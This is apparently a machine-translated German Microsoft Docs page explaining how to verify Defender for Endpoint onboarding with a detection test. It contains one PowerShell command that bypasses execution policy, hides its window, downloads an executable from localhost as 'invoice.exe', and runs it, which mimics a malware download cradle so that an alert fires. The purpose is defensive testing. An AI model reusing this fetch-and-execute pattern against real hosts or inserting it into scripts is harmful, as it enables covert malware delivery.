---
title: Ausführen eines Erkennungstests auf einem neu integrierten Microsoft Defender for Endpoint-Gerät
description: Führen Sie das Erkennungsskript auf einem neu integrierten Gerät aus, um zu überprüfen, ob es ordnungsgemäß in den Microsoft Defender for Endpoint-Dienst integrierte ist.
keywords: Erkennungstest, Erkennung, Powershell, Skript, Überprüfen, Onboarding, Microsoft Defender für Endpunkt-Onboarding, Clients, Server, Test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 89b8ac7d99cfcd4c5e5e647e5ba54e14184ef0bd
ms.sourcegitcommit: 3fe7eb32c8d6e01e190b2b782827fbadd73a18e6
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 04/13/2021
ms.locfileid: "51688117"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="7d5da-104">Ausführen eines Erkennungstests auf einem neu integrierten Microsoft Defender for Endpoint-Gerät</span><span class="sxs-lookup"><span data-stu-id="7d5da-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="7d5da-105">**Gilt für:**</span><span class="sxs-lookup"><span data-stu-id="7d5da-105">**Applies to:**</span></span>
- <span data-ttu-id="7d5da-106">Unterstützte Windows 10-Versionen</span><span class="sxs-lookup"><span data-stu-id="7d5da-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="7d5da-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="7d5da-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="7d5da-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="7d5da-108">Windows Server 2016</span></span>
- <span data-ttu-id="7d5da-109">Windows Server, Version 1803</span><span class="sxs-lookup"><span data-stu-id="7d5da-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="7d5da-110">Windows Server, 2019</span><span class="sxs-lookup"><span data-stu-id="7d5da-110">Windows Server, 2019</span></span>
- [<span data-ttu-id="7d5da-111">Microsoft Defender für Endpunkt</span><span class="sxs-lookup"><span data-stu-id="7d5da-111">Microsoft Defender for Endpoint</span></span>](https://go.microsoft.com/fwlink/?linkid=2154037)
- [<span data-ttu-id="7d5da-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="7d5da-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="7d5da-113">Möchten Sie Microsoft Defender for Endpoint erleben?</span><span class="sxs-lookup"><span data-stu-id="7d5da-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="7d5da-114">Registrieren Sie sich für eine kostenlose Testversion.</span><span class="sxs-lookup"><span data-stu-id="7d5da-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="7d5da-115">Führen Sie das folgende PowerShell-Skript auf einem neu integrierten Gerät aus, um sicherzustellen, dass es ordnungsgemäß an den Defender for Endpoint-Dienst meldet.</span><span class="sxs-lookup"><span data-stu-id="7d5da-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="7d5da-116">Erstellen Sie einen Ordner: "C:\test-MDATP-test".</span><span class="sxs-lookup"><span data-stu-id="7d5da-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="7d5da-117">Öffnen Sie eine Eingabeaufforderung mit erhöhten Rechten auf dem Gerät, und führen Sie das Skript aus:</span><span class="sxs-lookup"><span data-stu-id="7d5da-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="7d5da-118">Wechseln Sie zu **Start**, und geben Sie **cmd** ein.</span><span class="sxs-lookup"><span data-stu-id="7d5da-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="7d5da-119">Klicken Sie mit **der rechten Maustaste auf Eingabeaufforderung,** und wählen Sie Als Administrator ausführen **aus.**</span><span class="sxs-lookup"><span data-stu-id="7d5da-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![Fensteranfangsmenü, das auf Als Administrator ausführen zeigt](images/run-as-admin.png)

3. <span data-ttu-id="7d5da-121">Kopieren Und führen Sie an der Eingabeaufforderung den folgenden Befehl aus:</span><span class="sxs-lookup"><span data-stu-id="7d5da-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="7d5da-122">Das Eingabeaufforderungsfenster wird automatisch geschlossen.</span><span class="sxs-lookup"><span data-stu-id="7d5da-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="7d5da-123">Bei erfolgreicher Erkennung wird der Erkennungstest als abgeschlossen markiert, und eine neue Warnung wird in etwa 10 Minuten im Portal für das integrierte Gerät angezeigt.</span><span class="sxs-lookup"><span data-stu-id="7d5da-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="7d5da-124">Verwandte Themen</span><span class="sxs-lookup"><span data-stu-id="7d5da-124">Related topics</span></span>
- [<span data-ttu-id="7d5da-125">Onboarding von Windows 10-Geräten</span><span class="sxs-lookup"><span data-stu-id="7d5da-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="7d5da-126">Onboarding von Servern</span><span class="sxs-lookup"><span data-stu-id="7d5da-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="7d5da-127">Behandeln von Problemen beim Onboarding von Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="7d5da-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
